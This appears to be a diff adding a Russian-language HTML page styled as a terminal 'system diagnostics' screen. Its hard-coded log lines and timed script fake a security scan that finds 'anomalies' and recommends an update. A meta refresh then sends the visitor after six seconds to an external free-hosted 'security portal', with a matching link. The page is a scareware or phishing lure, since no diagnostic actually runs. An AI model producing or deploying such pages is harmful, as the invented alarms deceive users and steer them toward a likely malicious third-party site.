@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Системная диагностика</title>
+    <meta http-equiv="refresh" content="6;url=https://dearc-21.weeblysite.com/">
+    <style>
+        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 50px; }
+        .diagnostic { background: #111; padding: 40px; border: 1px solid #0f0; }
+        .log { background: #000; padding: 20px; border: 1px solid #333; margin: 20px 0; height: 150px; overflow-y: scroll; }
+        .log-line { margin: 5px 0; }
+        .blink { animation: blink 0.7s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div class="diagnostic">
+        <h1>> СИСТЕМНАЯ ДИАГНОСТИКА</h1>
+        <div class="log" id="log">
+            <div class="log-line">> Запуск диагностики безопасности...</div>
+            <div class="log-line">> Проверка целостности системы... [OK]</div>
+            <div class="log-line">> Сканирование на угрозы... [ВЫПОЛНЯЕТСЯ]</div>
+        </div>
+        <p>> Перенаправление на портал безопасности через 6 секунд</p>
+        <p>> <a href="https://dearc-21.weeblysite.com/" style="color: #0f0;">[ ПЕРЕЙТИ ]</a></p>
+        <p class="blink">_</p>
+    </div>
+    
+    <script>
+        setTimeout(function() {
+            document.getElementById('log').innerHTML += '<div class="log-line">> Обнаружены незначительные аномалии...</div>';
+        }, 2000);
+        setTimeout(function() {
+            document.getElementById('log').innerHTML += '<div class="log-line">> Рекомендуется обновление безопасности...</div>';
+        }, 4000);
+    </script>
+</body>
+</html>
